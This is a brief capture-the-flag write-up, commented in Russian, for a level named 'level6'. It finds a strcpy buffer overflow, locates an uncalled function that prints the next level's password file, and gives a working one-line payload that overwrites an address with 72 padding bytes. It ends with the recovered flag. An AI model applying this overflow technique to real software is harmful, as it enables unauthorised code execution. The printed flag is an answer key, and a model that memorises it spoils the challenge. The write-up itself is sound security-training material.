
# Вызов 'strcpy' уязвим для переполнения буфера
=> 0x80484c5 <main+73>:	call   0x8048340 <strcpy@plt>

# Есть функция 'n', которая вызывает 'system("/bin/cat /home/user/level7/.pass")'
# Но она не вызывается

# Сначала нам нужно найти адрес функции 'n'
gdb> x n
0x8048454 <n>:	0x83e58955

# потом готовим payload
./level6 $(python -c "print 'a'*72 + '\x54\x84\x04\x08'")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
